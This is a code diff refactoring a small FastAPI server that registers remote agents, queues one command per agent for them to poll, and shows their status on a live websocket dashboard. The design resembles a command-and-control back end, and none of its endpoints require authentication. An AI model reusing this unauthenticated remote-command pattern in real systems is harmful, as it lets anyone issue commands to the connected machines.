@@ -5,11 +5,23 @@ import asyncio
 
 app = FastAPI(title="Central Agent Control")
 
-# ================== التخزين المؤقت ==================
-clients = {}        # agents
-commands = {}       # commands per agent
+# ================== STORAGE ==================
+clients = {}        # agent_id -> info
+commands = {}       # agent_id -> command
 connections = set() # websocket clients
-# ====================================================
+# =============================================
+
+
+# ================== UTILS ==================
+async def broadcast():
+    dead = set()
+    for ws in connections:
+        try:
+            await ws.send_json(clients)
+        except:
+            dead.add(ws)
+    connections.difference_update(dead)
+# ===========================================
 
 
 # ================== API ==================
@@ -26,7 +38,7 @@ def get_agents():
 @app.post("/register")
 async def register(req: Request):
     data = await req.json()
-    cid = data.get("agent_id") or "unknown"
+    cid = data.get("agent_id")
 
     clients[cid] = {
         "ip": req.client.host,
@@ -52,56 +64,37 @@ async def heartbeat(req: Request):
         await broadcast()
 
     return {"ok": True}
-# ====================================================
 
 
-# ================== COMMANDS ==================
 @app.post("/command")
-async def send_command(req: Request):
+async def set_command(req: Request):
     data = await req.json()
-    aid = data["agent_id"]
-    cmd = data["command"]
-
-    commands.setdefault(aid, []).append({
-        "command": cmd,
-        "time": str(datetime.now())
-    })
-
+    commands[data["agent_id"]] = data["command"]
     return {"sent": True}
 
 
 @app.get("/command/{agent_id}")
 def get_command(agent_id: str):
-    if agent_id in commands and commands[agent_id]:
-        return commands[agent_id].pop(0)
-    return {}
-# ====================================================
+    cmd = commands.pop(agent_id, None)
+    return {"command": cmd}
+# ===========================================
 
 
 # ================== WEBSOCKET ==================
 @app.websocket("/ws")
-async def websocket_endpoint(ws: WebSocket):
+async def ws_endpoint(ws: WebSocket):
     await ws.accept()
     connections.add(ws)
+
+    # 🔥 أرسل الحالة الحالية فور الاتصال
+    await ws.send_json(clients)
 
     try:
         while True:
             await ws.receive_text()
     except WebSocketDisconnect:
         connections.remove(ws)
-
-
-async def broadcast():
-    dead = []
-    for ws in connections:
-        try:
-            await ws.send_json(clients)
-        except:
-            dead.append(ws)
-
-    for ws in dead:
-        connections.remove(ws)
-# ====================================================
+# ===============================================
 
 
 # ================== DASHBOARD ==================
@@ -111,41 +104,26 @@ def dashboard():
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
 <title>Agent Control Dashboard</title>
-
 <style>
-body{background:#0b0f14;color:#e5e7eb;font-family:Arial}
-h2{margin:15px}
-input{padding:6px;background:#020617;color:white;border:1px solid #334155}
-table{width:100%;border-collapse:collapse}
-th,td{padding:8px;border-bottom:1px solid #1f2937}
-th{background:#111827}
-tr:hover{background:#1f2937}
-.online{color:#22c55e}
-.offline{color:#ef4444}
-button{padding:4px 8px}
+body { background:#0b0f14; color:#eee; font-family:Arial }
+table { width:100%; border-collapse:collapse }
+th,td { padding:8px; border-bottom:1px solid #222 }
+.online { color:#4caf50 }
+.offline { color:#f44336 }
 </style>
 </head>
-
 <body>
 
 <h2>Agent Control Dashboard</h2>
-
 <input id="q" placeholder="Search hostname">
 
 <table>
 <thead>
 <tr>
-<th>ID</th>
-<th>Hostname</th>
-<th>Local IP</th>
-<th>Status</th>
-<th>Uptime</th>
-<th>Action</th>
+<th>ID</th><th>Hostname</th><th>Local IP</th><th>Status</th><th>Uptime</th><th>Action</th>
 </tr>
 </thead>
-
 <tbody id="rows"></tbody>
 </table>
 
@@ -186,7 +164,7 @@ function ping(id){
  });
 }
 
-// تحميل أولي
+// 🔥 تحميل أولي
 fetch('/agents')
  .then(r=>r.json())
  .then(data=>{
@@ -194,7 +172,7 @@ fetch('/agents')
    render();
  });
 
-// تحديث حي
+// 🔥 WebSocket
 let ws=new WebSocket(
  (location.protocol==='https:'?'wss':'ws')+'://'+location.host+'/ws'
 );
@@ -209,4 +187,4 @@ document.getElementById('q').onkeyup=render;
 </body>
 </html>
 """
-# ====================================================
+# ===============================================
